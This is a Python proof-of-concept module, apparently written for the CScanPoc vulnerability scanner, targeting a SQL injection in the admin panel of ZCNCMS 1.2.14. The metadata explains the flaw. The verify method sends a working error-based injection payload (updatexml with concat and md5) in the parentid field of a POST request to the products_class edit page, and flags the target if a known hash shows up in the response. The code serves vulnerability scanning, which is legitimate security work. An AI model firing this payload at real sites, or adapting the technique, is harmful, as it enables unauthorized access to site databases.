# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'ZCNCMS_0001_p'  # 平台漏洞编号，留空
    name = 'ZCNCMS后台SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-08-25'  # 漏洞公布时间
    desc = '''
        zcncms是站长中国基于php技术开发的内容管理系统。
        文件/module/menus/admincontroller/menus.php
        在$parentid != $infoold[‘parentid’]中，用的’!=’，很明显如果我们要控制$parentid的值，这个不等式肯定成立。但是errorinfo会使程序退出，所以这里需要一个在数据库不存在的parentid，使得取出$List为空，从而产生SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4053/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZCNCMS'  # 漏洞应用名称
    product_version = '1.2.14'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4fba5fab-70d9-4f46-a9ed-6aaebe3b05f1'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 注入需要后台权限
            payload = '/zcncms/admin/?c=products_class&a=edit&id=1'
            data = "submit=&parentid=12=@`\\\'`  and 1=(updatexml(1,concat(0x5e24,(select md5(c)),0x5e24),1));#@`\\\'`"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
